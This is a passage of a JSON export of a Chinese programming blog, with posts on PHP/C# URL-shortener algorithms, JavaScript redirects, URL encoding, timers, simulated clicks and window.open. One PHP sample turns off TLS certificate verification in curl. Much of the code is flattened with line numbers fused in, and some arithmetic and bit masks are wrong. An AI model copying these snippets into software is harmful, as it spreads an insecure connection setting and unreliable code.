$_SERVER[‘REQUEST_URI’]暂时世界清静了。要提取完整的重写后的URL地址，还没这么简单，需要考虑子目录下重写的情况，下回放出完整的无bug的提取重写url的函数，依靠此函数，将函数分割，然后形成$controller, $action .. 等参数","categories":[],"tags":[]},{"title":"微博短网址生成算法原理 by cubeking","slug":"php/微博短网址生成算法原理 by cubeking","date":"2012-12-18T15:12:08.000Z","updated":"2019-08-26T06:09:54.330Z","comments":true,"path":"2012/12/18/php/微博短网址生成算法原理 by cubeking/","link":"","permalink":"http://ningmo.github.io/2012/12/18/php/微博短网址生成算法原理 by cubeking/","excerpt":"","text":"短网址（Short URL），顾名思义就是在形式上比较短的网址。通常用的是asp或者php转向，在Web 2.0的今天，不得不说，这是一个潮流。目前已经有许多类似服务，借助短网址您可以用简短的网址替代原来冗长的网址，让使用者可以更容易的分享链接。 例如：http://t.cn/SzjPjA 表示http://hi.baidu.com/cubeking/ 短网址服务，可能很多朋友都已经不再陌生，现在大部分微博、手机邮件提醒等地方已经有很多应用模式了，并占据了一定的市场。估计很多朋友现在也正在使用。 看过新浪的短连接服务，发现后面主要有6个字符串组成，于是第一个想到的就是原来公司写的一个游戏激活码规则，也就是下面的算法2， 26个大写字母 26小写字母，10个数字，随机生成6个然后插入数据库对应一个id，短连接跳转的时候，根据字符串查询到对应id，即可实现相应的跳转！不过2的62次方，不知道有没有重复的，小概率可以，但是对应不是很大的网站应该足够了 自从twitter推出短网址(shorturl),继之国内各大微博跟风,google公开goo.gl使用API,短网址之风愈演愈烈.不得不说这是一个新兴又一大热门web2.0服务.现整理一下,包括完整短网址网站,短网址生成原理,算法举例,以及优劣比较,同时还介绍几个phper个人实现的. 算法原理算法一1)将长网址md5生成32位签名串,分为4段, 每段8个字节;2)对这四段循环处理, 取8个字节, 将他看成16进制串与0x3fffffff(30位1)与操作, 即超过30位的忽略处理;3)这30位分成6段, 每5位的数字作为字母表的索引取得特定字符, 依次进行获得6位字符串;4)总的md5串可以获得4个6位串; 取里面的任意一个就可作为这个长url的短url地址; 这种算法,虽然会生成4个,但是仍然存在重复几率,下面的算法一和三,就是这种的实现. 算法二a-zA-Z0-9 这64位取6位组合,可产生500多亿个组合数量.把数字和字符组合做一定的映射,就可以产生唯一的字符串,如第62个组合就是aaaaa9,第63个组合就是aaaaba,再利用洗牌算法，把原字符串打乱后保存，那么对应位置的组合字符串就会是无序的组合。把长网址存入数据库,取返回的id,找出对应的字符串,例如返回ID为1，那么对应上面的字符串组合就是bbb,同理 ID为2时，字符串组合为bba,依次类推,直至到达64种组合后才会出现重复的可能，所以如果用上面的62个字符，任意取6个字符组合成字符串的话，你的数据存量达到500多亿后才会出现重复的可能。具体参看这里彻底完善新浪微博接口和超短URL算法,算法四可以算作是此算法的一种实现,此算法一般不会重复,但是如果是统计的话,就有很大问题,特别是对域名相关的统计,就抓瞎了. 简单生成短网址方法 &lt;?php 02function base62($x)03{04 $show= ‘’;05 while($x&gt; 0) {06 $s= $x% 62;07 if($s&gt; 35) {08 $s= chr($s+61); 09 } elseif($s&gt; 9 &amp;&amp; $s&lt;=35) {10 $s= chr($s+ 55);11 }12 $show.= $s;13 $x= floor($x/62);14 }15 return $show; 16}17 18function urlShort($url)19{20 $url= crc32($url);21 $result= sprintf(“%u”, $url);22 return base62($result);23}24 25echo urlShort(“http://hi.baidu.com/cubeking/“);?&gt;短网址算法枚举 代码如下:&lt;?phpfunction shorturl($input) {$base32 = array (‘a’, ‘b’, ‘c’, ‘d’, ‘e’, ‘f’, ‘g’, ‘h’,‘i’, ‘j’, ‘k’, ‘l’, ‘m’, ‘n’, ‘o’, ‘p’,‘q’, ‘r’, ‘s’, ‘t’, ‘u’, ‘v’, ‘w’, ‘x’,‘y’, ‘z’, ‘0’, ‘1’, ‘2’, ‘3’, ‘4’, ‘5’); $hex = md5($input);$hexLen = strlen($hex);$subHexLen = $hexLen / 8;$output = array(); for ($i = 0; $i &lt; $subHexLen; $i++) {$subHex = substr ($hex, $i * 8, 8);$int = 0x3FFFFFFF &amp; (1 * (‘0x’.$subHex));$out = ‘’; for ($j = 0; $j &lt; 6; $j++) {$val = 0x0000001F &amp; $int;$out .= $base32[$val];$int = $int &gt;&gt; 5;} $output[] = $out;} return $output;}?&gt; 另一个是纯随机数算法&lt;?phpfunction random($length, $pool = ‘’){$random = ‘’; if (empty($pool)) {$pool = ‘abcdefghkmnpqrstuvwxyz’;$pool .= ‘23456789’;} srand ((double)microtime()*1000000); for($i = 0; $i &lt; $length; $i++){$random .= substr($pool,(rand()%(strlen ($pool))), 1);} return $random;}?&gt; 各大微博短网址(ShortUrl)的算法 ,第一种算法的C#实现&lt;?php// 这是c#代码,受编辑器的限制,只能用phppublic static string[] ShortUrl(string url){//可以自定义生成MD5加密字符传前的混合KEYstring key = “Leejor”;//要使用生成URL的字符string[] chars = new string[]{“a”,”b”,”c”,”d”,”e”,”f”,”g”,”h”,“i”,”j”,”k”,”l”,”m”,”n”,”o”,”p”,“q”,”r”,”s”,”t”,”u”,”v”,”w”,”x”,“y”,”z”,”0”,”1”,”2”,”3”,”4”,”5”,“6”,”7”,”8”,”9”,”A”,”B”,”C”,”D”,“E”,”F”,”G”,”H”,”I”,”J”,”K”,”L”,“M”,”N”,”O”,”P”,”Q”,”R”,”S”,”T”,“U”,”V”,”W”,”X”,”Y”,”Z” };//对传入网址进行MD5加密string hex = System.Web.Security.FormsAuthentication.HashPasswordForStoringInConfigFile(key + url, “md5”); string[] resUrl = new string[4]; for (int i = 0; i &lt; 4; i++){//把加密字符按照8位一组16进制与0x3FFFFFFF进行位与运算int hexint = 0x3FFFFFFF &amp; Convert.ToInt32(“0x” + hex.Substring(i * 8, 8), 16);string outChars = string.Empty;for (int j = 0; j &lt; 6; j++){//把得到的值与0x0000003D进行位与运算，取得字符数组chars索引int index = 0x0000003D &amp; hexint;//把取得的字符相加outChars += chars[index];//每次循环按位右移5位hexint = hexint &gt;&gt; 5;}//把字符串存入对应索引的输出数组resUrl[i] = outChars;} return resUrl;}?&gt; 高进制数字转换,使用六十二进制将十进制数字变“短”。例如数据库中第 56800235583 条信息，对应的短网址后缀可以是 ZZZZZZ 。下面是存储示例： &lt;?php//id 自增序列/自增编号//url 目标链接//suffix 短网址后缀 （并不需要存储在数据库内）+————+———————–+———+|id | url | suffix|+————+———————–+———+|123456 | http://zoeey.com/ | w7e |+————+———————–+———+|123457 | http://www.zoeey.com/ | w7f |+————+———————–+———+|56800235582 | http://zoeey.org/ | ZZZZZY |+————+———————–+———+|56800235583 | http://www.zoeey.org/ | ZZZZZZ |+————+———————–+———+?&gt;短网址使用流程：提交网址存储后获取其编号 如：123456用dec2Any将编号转换为62进制，并拼接网址 如：http://go.to/w7e用户访问到 http://go.to/w7e 时，提取短网址后缀 w7e用any2Dec将短网址后缀转换为10进制，得到链接编号 如：123456使用编号查询链接，并进行跳转[/list]下面是进制转换所需要的源码：&lt;?php/* MoXie (SysTem128@GMail.Com) 2010-6-30 17:53:57 Copyright &amp;copy; 2008-2010 Zoeey.Org . All rights are reserved. Code license: Apache License Version 2.0 http://www.apache.org/licenses/LICENSE-2.0.txt /error_reporting(E_ALL); /** 返回一字符串，十进制 number 以 radix 进制的表示。 @param dec 需要转换的数字 @param toRadix 输出进制。当不在转换范围内时，此参数会被设定为 2，以便及时发现。 @return 指定输出进制的数字 /function dec2Any($dec, $toRadix) {$MIN_RADIX = 2;$MAX_RADIX = 62;$num62 = ‘0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ’;if ($toRadix &lt; $MIN_RADIX || $toRadix &gt; $MAX_RADIX) {$toRadix = 2;}if ($toRadix == 10) {return $dec;}// -Long.MIN_VALUE 转换为 2 进制时长度为65$buf = array();$charPos = 64;$isNegative = $dec &lt; 0; //(bccomp($dec, 0) &lt; 0);if (!$isNegative) {$dec = -$dec; // bcsub(0, $dec);} while (bccomp($dec, -$toRadix) &lt;= 0) {$buf[$charPos–] = $num62[-bcmod($dec, $toRadix)];$dec = bcdiv($dec, $toRadix);}$buf[$charPos] = $num62[-$dec];if ($isNegative) {$buf[–$charPos] = ‘-‘;}$_any = ‘’;for ($i = $charPos; $i &lt; 65; $i++) {$_any .= $buf[$i];}return $_any;} /** 返回一字符串，包含 number 以 10 进制的表示。&lt;br /&gt; fromBase 只能在 2 和 62 之间（包括 2 和 62）。 @param number 输入数字 @param fromRadix 输入进制 @return 十进制数字 /function any2Dec($number, $fromRadix) {$num62 = ‘0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ’;$dec = 0;$digitValue = 0;$len = strlen($number) - 1;for ($t = 0; $t &lt;= $len; $t++) {$digitValue = strpos($num62, $number[$t]);$dec = bcadd(bcmul($dec, $fromRadix), $digitValue);}return $dec;} $sol = ‘&lt;br /&gt;’ . PHP_EOL;echo dec2Any(‘56800235583’, 62), $sol; // ZZZZZZecho any2Dec(‘ZZZZZZ’, 62), $sol; // 56800235583echo dec2Any(‘123456’, 62), $sol; // w7eecho any2Dec(‘w7e’, 62), $sol; // 123456?&gt; 另外,介绍一下goo.gl接口api的应用.据说此算法是各种短网址服务中 “……（这是）互联网上最稳定、最安全、最快速的短网址服务。”(google声称) 有人做了比较，证明确实如此。 除了速度快，goo.gl还提供详细的点击统计。比如，Yahoo首页的短网址是http://goo.gl/QuXj，那么它的统计数据就在http://goo.gl/info/QuXj。加上后缀&quot;.qr&quot;，还能得到这个网址的二维条形码，Yahoo的就是http://goo.gl/QuXj.qr。 详细信息可从这查看：http://code.google.com/apis/urlshortener/overview.html 下面是http://www.biaodianfu.com/php-google-urlshortener-api.html弄的一个简单的PHP调用API生成短网址方法，分享给大家。在使用前，请先到这里申请API Key：http://code.google.com/apis/console/短网址的生成需要使用POST提交数据，所以使用了curl，短网址的还原可以直接使用file_get_contents()函数。不过为了统一，也使用了curl来处理哈。&lt;?php// 生成function shortenGoogleUrl($long_url){$apiKey = ‘API-KEY’; //Get API key from : http://code.google.com/apis/console/$postData = array(‘longUrl’ =&gt; $long_url, ‘key’ =&gt; $apiKey);$jsonData = json_encode($postData);$curlObj = curl_init();curl_setopt($curlObj, CURLOPT_URL, ‘https://www.googleapis.com/urlshortener/v1/url&#39;);curl_setopt($curlObj, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, 0);curl_setopt($curlObj, CURLOPT_HEADER, 0);curl_setopt($curlObj, CURLOPT_HTTPHEADER, array(‘Content-type:application/json’));curl_setopt($curlObj, CURLOPT_POST, 1);curl_setopt($curlObj, CURLOPT_POSTFIELDS, $jsonData);$response = curl_exec($curlObj);curl_close($curlObj);$json = json_decode($response);return $json-&gt;id;} //还原function expandGoogleUrl($short_url){$curlObj = curl_init();curl_setopt($curlObj, CURLOPT_URL, ‘https://www.googleapis.com/urlshortener/v1/url?shortUrl=&#39;.$short_url);curl_setopt($curlObj, CURLOPT_HEADER, 0);curl_setopt($curlObj, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, 0);$response = curl_exec($curlObj);curl_close($curlObj);$json = json_decode($response);return $json-&gt;longUrl;}?&gt; PHP SDK 下载地址：http://code.google.com/p/libweibo/ （包含新版接口及OAuth2.0，由SAE提供维护，SAE平台已集成最新版PHPSDK） &nbsp; Demo使用教程 在open.weibo.com创建应用，得到AppKey，设置“授权设置”中的“应用回调页”地址为\"http://host/callback.php\"，其中host为网站域名。 下载Demo,然后解压,修改config.php中的WB_AKEY为App Key，WB_SKEY为App Secret，WB_CALLBACK_URL为刚才填入的回调页地址。 上传到PHP空间即可","categories":[{"name":"php","slug":"php","permalink":"http://ningmo.github.io/categories/php/"}],"tags":[]},{"title":"页面跳转","slug":"js/js_jump_page","date":"2012-12-18T15:08:46.000Z","updated":"2019-08-26T06:09:54.308Z","comments":true,"path":"2012/12/18/js/js_jump_page/","link":"","permalink":"http://ningmo.github.io/2012/12/18/js/js_jump_page/","excerpt":"","text":"··· header(\"location:url\"); window.navigate('url'); location.href='url'; location.replace('url');//不能后退 location.reload(true); ···","categories":[],"tags":[]},{"title":"页面跳转","slug":"js/页面跳转","date":"2012-12-18T15:08:46.000Z","updated":"2019-08-26T08:22:13.781Z","comments":true,"path":"2012/12/18/js/页面跳转/","link":"","permalink":"http://ningmo.github.io/2012/12/18/js/页面跳转/","excerpt":"","text":"1234567&lt;meta http-equiv=\"refresh\" content=\"3\"&gt;&lt;meta http-equiv=\"refresh\" content=\"3;url=http:www.baidu.com\"&gt;header(\"location:url\");window.navigate('url');location.href='url';location.replace('url');//不能后退location.reload(true);","categories":[],"tags":[]},{"title":"javascript urlencode 推荐 encodeURIComponent","slug":"js/javascript urlencode 推荐 encodeURIComponent","date":"2012-12-18T15:06:16.000Z","updated":"2019-08-26T08:23:58.639Z","comments":true,"path":"2012/12/18/js/javascript urlencode 推荐 encodeURIComponent/","link":"","permalink":"http://ningmo.github.io/2012/12/18/js/javascript urlencode 推荐 encodeURIComponent/","excerpt":"","text":"网上查到的全都是escape，和需要的编码不是一回事，好不容易找到的结果 保存下来以备以后使用js对文字进行编码涉及3个函数：escape,encodeURI,encodeURIComponent，相应3个解码函数：unescape,decodeURI,decodeURIComponent1、 传递参数时需要使用encodeURIComponent，这样组合的url才不会被#等特殊字符截断。例如： 1&lt;script language=&quot;javascript&quot;&gt;document.write(&apos;&lt;a href=&quot;http://passport.baidu.com/?logout&amp;aid=7&amp;u=&apos;+encodeURIComponent(&quot;http://cang.baidu.com/bruce42&quot;)+&apos;&quot;&gt;退出&lt;/a&gt;&apos;);&lt;/script&gt; 2、 进行url跳转时可以整体使用encodeURI例如：1Location.href=&quot;/encodeURI&quot;(&quot;http://cang.baidu.com/do/s?word=百度&amp;ct=21&quot;); 3、 js使用数据时可以使用escape例如：搜藏中history纪录。4、 escape对0-255以外的unicode值进行编码时输出%u****格式，其它情况下escape，encodeURI，encodeURIComponent编码结果相同。最多使用的应为encodeURIComponent，它是将中文、韩文等特殊字符转换成utf-8格式的url编码，所以如果给后台传递参数需要使用encodeURIComponent时需要后台解码对utf-8支持（form中的编码方 ```","categories":[{"name":"js","slug":"js","permalink":"http://ningmo.github.io/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"http://ningmo.github.io/tags/js/"}]},{"title":"the_post_thumbnail和get_the_post_thumbnail","slug":"php/the_post_thumbnail和get_the_post_thumbnail","date":"2012-12-18T15:01:30.000Z","updated":"2019-08-26T06:09:54.328Z","comments":true,"path":"2012/12/18/php/the_post_thumbnail和get_the_post_thumbnail/","link":"","permalink":"http://ningmo.github.io/2012/12/18/php/the_post_thumbnail和get_the_post_thumbnail/","excerpt":"","text":"the_post_thumbnail 在 WordPress 中主要用来打印文章中设定的缩略图，而 get_the_post_thumbnail 函数可以将你需要的 HTML 代码以字符串的形式返回。 the_post_thumbnail 函数的使用 the_post_thumbnail($size,$attr) 函数参数$size 是指你想要的缩略图类型 默认是 ‘post-thumbnail’ 也就是特色图像 $attr 图像img标签中的属性设置。 the_post_thumbnail 函数声明 /** * Display Post Thumbnail. * * @since 2.9.0 * * @param int $size Optional. Image size. Defaults to 'post-thumbnail', which theme sets using set_post_thumbnail_size( $width, $height, $crop_flag );. * @param string|array $attr Optional. Query string or array of attributes. */functionthe_post_thumbnail($size='post-thumbnail',$attr=''){echoget_the_post_thumbnail(null,$size,$attr);} get_the_post_thumbnail 函数声明 *Retrieve Post Thumbnail.**@since 2.9.0 **@param int $post_idOptional.Post ID.*@param string $sizeOptional.Image size.Defaults to 'post-thumbnail'.*@param string|array$attrOptional.Query string or arrayof attributes.*/functionget_the_post_thumbnail($post_id=null,$size='post-thumbnail',$attr=''){$post_id=(null===$post_id)? get_the_ID():$post_id;$post_thumbnail_id=get_post_thumbnail_id($post_id);$size=apply_filters('post_thumbnail_size',$size);if($post_thumbnail_id){do_action('begin_fetch_post_thumbnail_html',$post_id,$post_thumbnail_id,$size);// for \"Just In Time\" filtering of all of wp_get_attachment_image()'s filtersif(in_the_loop())update_post_thumbnail_cache();$html=wp_get_attachment_image($post_thumbnail_id,$size,false,$attr);do_action('end_fetch_post_thumbnail_html',$post_id,$post_thumbnail_id,$size);}else{$html='';}returnapply_filters('post_thumbnail_html',$html,$post_id,$post_thumbnail_id,$size,$attr);}","categories":[],"tags":[]},{"title":"php获取当前页面的URL","slug":"php/php获取当前页面的URL","date":"2012-12-16T09:55:32.000Z","updated":"2019-08-26T06:09:54.328Z","comments":true,"path":"2012/12/16/php/php获取当前页面的URL/","link":"","permalink":"http://ningmo.github.io/2012/12/16/php/php获取当前页面的URL/","excerpt":"","text":"1234567891011121314151617181920212223function curPageURL() &#123; $pageURL = &apos;http&apos;; if ($_SERVER[&quot;HTTPS&quot;] == &quot;on&quot;) &#123; $pageURL .= &quot;s&quot;; &#125; $pageURL .= &quot;://&quot;; if ($_SERVER[&quot;SERVER_PORT&quot;] != &quot;80&quot;) &#123; $pageURL .= $_SERVER[&quot;SERVER_NAME&quot;] . &quot;:&quot; . $_SERVER[&quot;SERVER_PORT&quot;] . $_SERVER[&quot;REQUEST_URI&quot;]; &#125; else &#123; $pageURL .= $_SERVER[&quot;SERVER_NAME&quot;] . $_SERVER[&quot;REQUEST_URI&quot;]; &#125; return $pageURL;&#125; ?&gt;","categories":[],"tags":[]},{"title":"Js setInterval与setTimeout(定时执行与循环执行)","slug":"js/Js setInterval与setTimeout(定时执行与循环执行)","date":"2012-12-15T16:36:11.000Z","updated":"2019-08-26T08:23:51.316Z","comments":true,"path":"2012/12/16/js/Js setInterval与setTimeout(定时执行与循环执行)/","link":"","permalink":"http://ningmo.github.io/2012/12/16/js/Js setInterval与setTimeout(定时执行与循环执行)/","excerpt":"","text":"Document自带的方法：循环执行：var timeid = window.setInterval（“方法名或方法”，“延时”）;window.clearInterval(timeid);定时执行：var tmid = window.setTimeout(“方法名或方法”, “延时”);window.clearTimeout(tmid);举例说明： 12345678910111213141516171819202122232425262728293031A.当要执行的方法中不需要参数时 &lt;script type=”text/javascript”&gt; //循环执行，每隔3秒钟执行一次showalert（） window.setInterval(showalert, 3000); function showalert() &#123; alert(“aaaaa”); &#125; //定时执行，5秒后执行show() window.setTimeout(show,5000); function show() &#123; alert(“bbb”); &#125; &lt;/script&gt; B.当要执行的方法中需要参数时 复制代码代码如下:&lt;script type=”text/javascript”&gt; //循环执行，每隔3秒钟执行一次 showalert（） window.setInterval(function()&#123; showalert(“aaaaa”); &#125;, 3000); function showalert(mess) &#123; alert(mess); &#125; //定时执 行，5秒后执行showalert() window.setTimeout(function()&#123; showalert(“bbbbbb”); &#125;,5000); &lt;/script&gt;","categories":[{"name":"js","slug":"js","permalink":"http://ningmo.github.io/categories/js/"}],"tags":[]},{"title":"js模拟点击事件","slug":"js/js模拟点击事件","date":"2012-12-15T16:34:31.000Z","updated":"2019-08-26T06:09:54.309Z","comments":true,"path":"2012/12/16/js/js模拟点击事件/","link":"","permalink":"http://ningmo.github.io/2012/12/16/js/js模拟点击事件/","excerpt":"","text":"在实际的应用开发中，我们会常常用到JS的模事件，比如说点击事件，举个简单的例子，点击表单外的“提交”按钮来提交表单。上代码吧。 1&lt;h3&gt;请单击“提交”，测试提交按钮的单击事件也被触发了。&lt;/h3&gt; &lt;button id=&quot;btn&quot;&gt;提交&lt;/button&gt; &lt;form action=&quot;#&quot; method=&quot;get&quot; id=&quot;form&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;site&quot; value=&quot;www.woiweb.net&quot; readonly/&gt; &lt;input id=&quot;subbtn&quot; type=&quot;submit&quot; value=&quot;先别点击此按钮提交&quot; onclick=&quot;alert(&apos;我已经提交了&apos;);&quot;/&gt; &lt;/form&gt; Javscript: &lt;script type=&quot;text/javascript&quot;&gt; var sub = document.getElementById(&quot;subbtn&quot;); var btn = document.getElementById(&quot;btn&quot;); //通用方法 btn.onclick = function() &#123; sub.click(); &#125; &lt;/script&gt; 经过测试，IE，FF，Chrome，Opera，Safari都没有问题，均可正常提交表单。 但在实际的设计中，为了让提交按钮更好看，buildder经常把它们用a标签来处理，加个背景图片来模拟按钮，我们仍然用上面的思路来尝试，增加一个a标签，让它来提交表单，我们仅修改html。 12&lt;h3&gt;请单击“提交”，测试提交按钮的单击事件也被触发了。&lt;/h3&gt; &lt;button id=&quot;btn&quot;&gt;提交&lt;/button&gt; &lt;form action=&quot;#&quot; method=&quot;get&quot; id=&quot;form&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;site&quot; value=&quot;www.woiweb.net&quot; readonly/&gt; &lt;!--&lt;input id=&quot;subbtn&quot; type=&quot;submit&quot; value=&quot;先别点击此按钮提交&quot; onclick=&quot;alert(&apos;我已经提交了&apos;);&quot;/&gt; --&gt; &lt;a id=&quot;subbtn&quot; href=&quot;javascript:;&quot; onclick=&quot;alert(&apos;在此调用提交表单的方法&apos;)&quot;&gt;模拟提交按钮&lt;/a&gt; &lt;/form&gt; javascript: &lt;script type=&quot;text/javascript&quot;&gt; var sub = document.getElementById(&quot;subbtn&quot;); var btn = document.getElementById(&quot;btn&quot;); //通用方法 btn.onclick = function() &#123; sub.click(); &#125; 8 &lt;/script&gt; 运行后，问题出现了，IE、FF、Opera均OK，但Chrome和Safari不能正常运行，后来网上搜索了下，发现a标签并不是和按钮一样有onclick()事件的，解决办法是针对 IE 和 FF编写不同的逻辑，JS代码如下： 12&lt;script type=&quot;text/javascript&quot;&gt; var sub = document.getElementById(&quot;subbtn&quot;); var btn = document.getElementById(&quot;btn&quot;); //通用方法 btn.onclick = function() &#123; //sub.click(); if (/msie/i.test(navigator.userAgent)) //IE &#123; sub.fireEvent(&quot;onclick&quot;); &#125; else &#123; var e = document.createEvent(&apos;MouseEvent&apos;); e.initEvent(&apos;click&apos;, false, false); sub.dispatchEvent(e); &#125; &#125; &lt;/script&gt; 至此，问题解决，虽然这个问题很简单，但很容易被大家忽略，贴出来和大家一起分享。 语法：createEvent(eventType) 参数 描述eventType 想获取的 Event 对象的事件模块名。关于有效的事件类型列表，请参阅”说明”部分。返回值 返回新创建的 Event 对象，具有指定的类型。 抛出 如果实现支持需要的事件类型，该方法将抛出代码为 NOT_SUPPORTED_ERR 的 DOMException 异常。 说明 该方法将创建一种新的事件类型，该类型由参数 eventType 指定。注意，该参数的值不是要创建的事件接口的名称，而是定义那个接口的 DOM 模块的名称。 下表列出了 eventType 的合法值和每个值创建的事件接口： 12345参数 事件接口 初始化方法HTMLEvents HTMLEvent iniEvent()MouseEvents MouseEvent iniMouseEvent()UIEvents UIEvent iniUIEvent() 用该方法创建了 Event 对象以后，必须用上表中所示的初始化方法初始化对象。关于初始化方法的详细信息，请参阅 Event 对象参考。 该方法实际上不是由 Document 接口定义的，而是由 DocumentEvent 接口定义的。如果一个实现支持 Event 模块，那么 Document 对象就会实现 DocumentEvent 接口并支持该方法。","categories":[],"tags":[]},{"title":"JS打开新窗口","slug":"js/JS打开新窗口","date":"2012-12-15T07:54:20.000Z","updated":"2019-08-26T06:09:54.305Z","comments":true,"path":"2012/12/15/js/JS打开新窗口/","link":"","permalink":"http://ningmo.github.io/2012/12/15/js/JS打开新窗口/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859this.Page.RegisterStartupScript(&quot;key&quot;, &quot;&amp;lt;script&amp;gt;window.open(&apos;Error.aspx&apos;,target=&apos;blank&apos;)&amp;lt;/script&amp;gt;&quot;);this.Page.RegisterStartupScript(&quot;key&quot;, &quot;&amp;lt;script&amp;gt;window.open(&apos;Error.aspx&apos;,target=&apos;top&apos;)&amp;lt;/script&amp;gt;&quot;);window.open (&apos;page.html&apos;,&apos;newwindow&apos;,&apos;height=100,width=400,top=0,left=0,toolbar=no,menubar=no,scrollbars=no, resizable=no,location=no, status=no&apos;) 脚本运行后，page.html将在新窗体newwindow中打开，宽为100，高为400，距屏顶0象素，屏左0象素，无工具条，无菜单条，无滚动条，不可调整大小，无地址栏，无状态栏。请对照。上例中涉及的为常用的几个参数，除此以外还有很多其他参数，请见四。四、各项参数其中yes/no也可使用1/0；pixel value为具体的数值，单位象素。参数 | 取值范围 |说明 | |alwaysLowered | yes/no |指定窗口隐藏在所有窗口之后 alwaysRaised | yes/no |指定窗口悬浮在所有窗口之上 depended | yes/no |是否和父窗口同时关闭 directories | yes/no |Nav2和3的目录栏是否可见 height | pixel value |窗口高度 hotkeys | yes/no |在没菜单栏的窗口中设安全退出热键 innerHeight | pixel value |窗口中文档的像素高度 innerWidth | pixel value |窗口中文档的像素宽度 location | yes/no |位置栏是否可见 menubar | yes/no |菜单栏是否可见 outerHeight | pixel value |设定窗口(包括装饰边框)的像素高度 outerWidth | pixel value |设定窗口(包括装饰边框)的像素宽度 resizable | yes/no |窗口大小是否可调整 screenX | pixel value |窗口距屏幕左边界的像素长度 screenY | pixel value |窗口距屏幕上边界的像素长度 scrollbars | yes/no |窗口是否可有滚动栏 titlebar | yes/no |窗口题目栏是否可见 toolbar | yes/no |窗口工具栏是否可见 Width | pixel value |窗口的像素宽度 z-look | yes/no |窗口被激活后是否浮在其它窗口之上window.showModalDialog使用手册基本介绍：showModalDialog() (IE 4+支持)showModelessDialog() (IE 5+支持)window.showModalDialog()方法用来创建一个显示HTML内容的模态对话框。window.showModelessDialog()方法用来创建一个显示HTML内容的非模态对话框。使用方法：vReturnValue =window.showModalDialog(sURL [, vArguments] [,sFeatures])vReturnValue =window.showModelessDialog(sURL [, vArguments] [,sFeatures])参数说明：sURL--必选参数，类型：字符串。用来指定对话框要显示的文档的URL。vArguments--可选参数，类型：变体。用来向对话框传递参数。传递的参数类型不限，包括数组等。对话框通过window.dialogArguments来取得传递进来的参数。sFeatures--可选参数，类型：字符串。用来描述对话框的外观等信息，可以使用以下的一个或几个，用分号“;”隔开。1.dialogHeight :对话框高度，不小于１００px，ＩＥ４中dialogHeight 和 dialogWidth 默认的单位是em，而ＩＥ５中是px，为方便其见，在定义modal方式的对话框时，用px做单位。2.dialogWidth: 对话框宽度。3.dialogLeft: 离屏幕左的距离。4.dialogTop: 离屏幕上的距离。5.center: &#123;yes | no | 1| 0&#125;：窗口是否居中，默认yes，但仍可以指定高度和宽度。6.help: &#123;yes | no | 1| 0&#125;：是否显示帮助按钮，默认yes。7.resizable: &#123;yes | no | 1| 0&#125; ［ＩＥ５＋］：是否可被改变大小。默认no。8.status: &#123;yes | no | 1| 0&#125; ［IE5+］：是否显示状态栏。默认为yes[ Modeless]或no[Modal]。9.scroll:&#123; yes | no | 1| 0| on |off &#125;：指明对话框是否显示滚动条。默认为yes。下面几个属性是用在HTA中的，在一般的网页中一般不使用。10.dialogHide:&#123; yes | no | 1| 0| on |off &#125;：在打印或者打印预览时对话框是否隐藏。默认为no。11.edge:&#123; sunken |raised &#125;：指明对话框的边框样式。默认为raised。12.unadorned:&#123; yes | no | 1| 0| on | off &#125;：默认为no。 &nbsp;","categories":[],"tags":[]}]}